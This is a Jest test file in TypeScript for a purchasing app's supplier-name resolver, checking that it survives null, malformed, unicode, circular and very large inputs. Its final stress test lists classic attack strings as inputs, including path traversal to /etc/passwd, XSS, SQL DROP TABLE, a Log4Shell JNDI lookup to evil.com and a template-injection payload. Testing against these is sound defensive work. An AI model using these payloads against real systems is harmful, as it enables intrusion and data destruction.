// src/components/purchase/tests/supplierNameResolver.errorProof.test.ts
// Comprehensive test untuk memastikan supplier name resolver tidak pernah crash

import { 
  createSupplierNameResolver, 
  safeGetSupplierName, 
  isValidSupplier,
  getSupplierName 
} from '../utils/purchaseHelpers';

describe('Supplier Name Resolver - Error Proof Tests', () => {
  const validSuppliers = [
    { id: 'sup1', nama: 'PT. Supplier Utama' },
    { id: 'sup2', nama: 'CV. Bahan Baku Sejahtera' },
    { id: 'sup3', nama: 'UD. Sumber Rejeki' },
    { id: 'sup4', nama: '' }, // Edge case: empty name
    { id: '', nama: 'Supplier No ID' }, // Edge case: empty ID
  ];

  describe('createSupplierNameResolver - Extreme Edge Cases', () => {
    it('should handle null supplier array gracefully', () => {
      const resolver = createSupplierNameResolver(null);
      expect(resolver('sup1')).toBe('sup1');
      expect(resolver('')).toBe('Tidak ada supplier');
      expect(resolver(null)).toBe('Tidak ada supplier');
    });

    it('should handle undefined supplier array gracefully', () => {
      const resolver = createSupplierNameResolver(undefined);
      expect(resolver('sup1')).toBe('sup1');
      expect(resolver('test')).toBe('test');
    });

    it('should handle empty supplier array', () => {
      const resolver = createSupplierNameResolver([]);
      expect(resolver('sup1')).toBe('sup1');
      expect(resolver('any-id')).toBe('any-id');
    });

    it('should handle malformed supplier objects', () => {
      const malformedSuppliers: any[] = [
        null,
        undefined,
        'string-instead-of-object',
        123,
        {},
        { id: null, nama: 'Test' },
        { id: 'valid', nama: null },
        { wrongProperty: 'value' },
        { id: 123, nama: 'Number ID' }, // wrong type
      ];

      const resolver = createSupplierNameResolver(malformedSuppliers);
      expect(resolver('sup1')).toBe('sup1');
      expect(() => resolver('test')).not.toThrow();
    });

    it('should handle all types of invalid supplier IDs', () => {
      const resolver = createSupplierNameResolver(validSuppliers);

      // Test various invalid inputs
      const invalidInputs: any[] = [
        null,
        undefined,
        '',
        '   ', // whitespace only
        0,
        false,
        {},
        [],
        NaN,
        Infinity
      ];

      invalidInputs.forEach(input => {
        expect(() => resolver(input)).not.toThrow();
        const result = resolver(input);
        expect(typeof result).toBe('string');
        expect(result).toBe('Tidak ada supplier');
      });
    });

    it('should handle circular references and complex objects', () => {
      const circularSuppliers: any[] = [
        { id: 'sup1', nama: 'Test Supplier' }
      ];
      
      // Create circular reference
      circularSuppliers[0].self = circularSuppliers[0];
      circularSuppliers.push(circularSuppliers);

      const resolver = createSupplierNameResolver(circularSuppliers);
      expect(() => resolver('sup1')).not.toThrow();
      expect(resolver('sup1')).toBe('Test Supplier');
    });

    it('should handle extremely long strings gracefully', () => {
      const longId = 'x'.repeat(10000);
      const longName = 'y'.repeat(10000);
      
      const suppliersWithLongValues = [
        { id: longId, nama: 'Normal Name' },
        { id: 'normal', nama: longName }
      ];

      const resolver = createSupplierNameResolver(suppliersWithLongValues);
      expect(() => resolver(longId)).not.toThrow();
      expect(() => resolver('normal')).not.toThrow();
      expect(resolver(longId)).toBe('Normal Name');
      expect(resolver('normal')).toBe(longName);
    });

    it('should handle unicode and special characters', () => {
      const unicodeSuppliers = [
        { id: 'émoji-🚀', nama: 'Unicode Supplier 🏢' },
        { id: '中文', nama: 'Chinese Characters' },
        { id: '🇮🇩-supplier', nama: 'Emoji ID Supplier' },
        { id: 'normal', nama: 'Åccënted Nåmé' }
      ];

      const resolver = createSupplierNameResolver(unicodeSuppliers);
      expect(resolver('émoji-🚀')).toBe('Unicode Supplier 🏢');
      expect(resolver('中文')).toBe('Chinese Characters');
      expect(resolver('🇮🇩-supplier')).toBe('Emoji ID Supplier');
      expect(resolver('normal')).toBe('Åccënted Nåmé');
    });
  });

  describe('safeGetSupplierName - Ultimate Safety', () => {
    it('should never throw errors regardless of input', () => {
      const crazyInputs: any[] = [
        null, undefined, '', '  ', 0, -1, NaN, Infinity,
        {}, [], true, false, Symbol('test'),
        () => {}, new Date(), /regex/
      ];

      const crazySuppliers: any[] = [
        null, undefined, 'string', 123, {},
        [null, undefined, 'invalid'],
        { wrongStructure: true }
      ];

      crazyInputs.forEach(supplierId => {
        crazySuppliers.forEach(suppliers => {
          expect(() => safeGetSupplierName(supplierId, suppliers)).not.toThrow();
          const result = safeGetSupplierName(supplierId, suppliers);
          expect(typeof result).toBe('string');
          expect(result.length).toBeGreaterThan(0);
        });
      });
    });

    it('should use custom fallback when provided', () => {
      const customFallback = 'Custom Error Message';
      expect(safeGetSupplierName(null, null, customFallback)).toBe(customFallback);
      expect(safeGetSupplierName('', [], customFallback)).toBe(customFallback);
      expect(safeGetSupplierName(undefined, undefined, customFallback)).toBe(customFallback);
    });

    it('should handle async/promise-like objects gracefully', () => {
      const promiseLikeSupplier: any = {
        then: () => 'promise-like',
        id: 'sup1',
        nama: 'Promise Supplier'
      };

      expect(() => safeGetSupplierName('sup1', [promiseLikeSupplier])).not.toThrow();
      expect(safeGetSupplierName('sup1', [promiseLikeSupplier])).toBe('Promise Supplier');
    });
  });

  describe('isValidSupplier - Input Validation', () => {
    it('should validate supplier IDs correctly', () => {
      // Valid cases
      expect(isValidSupplier('sup1')).toBe(true);
      expect(isValidSupplier('a')).toBe(true);
      expect(isValidSupplier('123')).toBe(true);
      expect(isValidSupplier('uuid-123-456')).toBe(true);

      // Invalid cases
      expect(isValidSupplier(null)).toBe(false);
      expect(isValidSupplier(undefined)).toBe(false);
      expect(isValidSupplier('')).toBe(false);
      expect(isValidSupplier('   ')).toBe(false);
      expect(isValidSupplier(123 as any)).toBe(false);
      expect(isValidSupplier({} as any)).toBe(false);
      expect(isValidSupplier([] as any)).toBe(false);
    });
  });

  describe('Integration Tests - Real World Scenarios', () => {
    it('should handle mixed data types in supplier array', () => {
      const mixedSuppliers: any[] = [
        { id: 'valid1', nama: 'Valid Supplier 1' },
        null,
        { id: 'valid2', nama: 'Valid Supplier 2' },
        undefined,
        'string-object',
        { id: 'valid3' }, // missing nama
        { nama: 'No ID Supplier' }, // missing id
        123,
        { id: 'valid4', nama: 'Valid Supplier 4' }
      ];

      const resolver = createSupplierNameResolver(mixedSuppliers);
      
      // Should find valid suppliers
      expect(resolver('valid1')).toBe('Valid Supplier 1');
      expect(resolver('valid2')).toBe('Valid Supplier 2');
      expect(resolver('valid4')).toBe('Valid Supplier 4');
      
      // Should fallback for invalid ones
      expect(resolver('valid3')).toBe('valid3');
      expect(resolver('nonexistent')).toBe('nonexistent');
    });

    it('should handle database-like scenarios with null/undefined values', () => {
      const dbLikeSuppliers = [
        { id: 'sup1', nama: null }, // null from database
        { id: 'sup2', nama: undefined }, // undefined field
        { id: 'sup3', nama: '' }, // empty string
        { id: 'sup4', nama: '   ' }, // whitespace only
        { id: null, nama: 'No ID' }, // null ID
        { id: 'sup5', nama: 'Valid Supplier' }
      ];

      const resolver = createSupplierNameResolver(dbLikeSuppliers);
      
      expect(resolver('sup1')).toBe('sup1'); // Fallback to ID
      expect(resolver('sup2')).toBe('sup2'); // Fallback to ID
      expect(resolver('sup3')).toBe('sup3'); // Fallback to ID (empty name)
      expect(resolver('sup4')).toBe('sup4'); // Fallback to ID (whitespace)
      expect(resolver('sup5')).toBe('Valid Supplier'); // Valid case
    });

    it('should handle concurrent modifications (simulate race conditions)', () => {
      let suppliers = [{ id: 'sup1', nama: 'Original Name' }];
      const resolver = createSupplierNameResolver(suppliers);

      // Simulate external modification of suppliers array
      suppliers.push({ id: 'sup2', nama: 'New Supplier' });
      suppliers[0].nama = 'Modified Name';
      suppliers = []; // Clear array

      // Resolver should still work with its captured reference
      expect(() => resolver('sup1')).not.toThrow();
      expect(() => resolver('sup2')).not.toThrow();
      expect(() => resolver('nonexistent')).not.toThrow();
    });

    it('should work correctly in table rendering scenarios', () => {
      const mockPurchases = [
        { id: 'p1', supplier: 'sup1' },
        { id: 'p2', supplier: null },
        { id: 'p3', supplier: undefined },
        { id: 'p4', supplier: '' },
        { id: 'p5', supplier: 'nonexistent' },
        { id: 'p6', supplier: 'sup2' }
      ];

      const resolver = createSupplierNameResolver(validSuppliers);

      // Simulate table rendering
      mockPurchases.forEach(purchase => {
        expect(() => resolver(purchase.supplier as any)).not.toThrow();
        const displayName = resolver(purchase.supplier as any);
        expect(typeof displayName).toBe('string');
        expect(displayName.length).toBeGreaterThan(0);
      });
    });
  });

  describe('Performance Tests', () => {
    it('should handle large suppliers list efficiently', () => {
      const largeSuppliersList = Array.from({ length: 10000 }, (_, i) => ({
        id: `supplier-${i}`,
        nama: `Supplier Name ${i}`
      }));

      const resolver = createSupplierNameResolver(largeSuppliersList);

      const startTime = performance.now.call(performance);
      
      // Test multiple lookups
      for (let i = 0; i < 100; i++) {
        resolver(`supplier-${i * 100}`);
        resolver('nonexistent');
        resolver(null as any);
        resolver('');
      }
      
      const endTime = performance.now.call(performance);
      const executionTime = endTime - startTime;

      // Should complete in reasonable time (less than 50ms for 400 operations on 10k items)
      expect(executionTime).toBeLessThan(50);
    });

    it('should handle memory efficiently with repeated calls', () => {
      const resolver = createSupplierNameResolver(validSuppliers);

      // Simulate many repeated calls (like in UI rendering)
      for (let i = 0; i < 10000; i++) {
        resolver('sup1');
        resolver('nonexistent');
        resolver(null as any);
      }

      // If we get here without memory errors, test passes
      expect(true).toBe(true);
    });
  });
});

/**
 * Stress Test: Extreme Scenarios
 */
describe('Supplier Name Resolver - Stress Tests', () => {
  it('should handle malicious inputs without crashing', () => {
    const maliciousInputs = [
      '../../etc/passwd',
      '<script>alert("xss")</script>',
      'DROP TABLE suppliers;',
      '${jndi:ldap://evil.com}',
      '{{constructor.constructor("return process")().exit()}}',
      Array(100000).fill('a').join(''), // Extremely long string
      JSON.stringify(Array(1000).fill({ recursive: true })) // Large JSON
    ];

    const resolver = createSupplierNameResolver(validSuppliers);

    maliciousInputs.forEach(maliciousInput => {
      expect(() => resolver(maliciousInput)).not.toThrow();
      const result = resolver(maliciousInput);
      expect(typeof result).toBe('string');
    });
  });

  it('should handle deeply nested objects in suppliers array', () => {
    const deepObject: any = { id: 'deep', nama: 'Deep Supplier' };
    for (let i = 0; i < 1000; i++) {
      deepObject[`level${i}`] = { deeper: deepObject };
    }

    const resolver = createSupplierNameResolver([deepObject]);
    expect(() => resolver('deep')).not.toThrow();
    expect(resolver('deep')).toBe('Deep Supplier');
  });
});
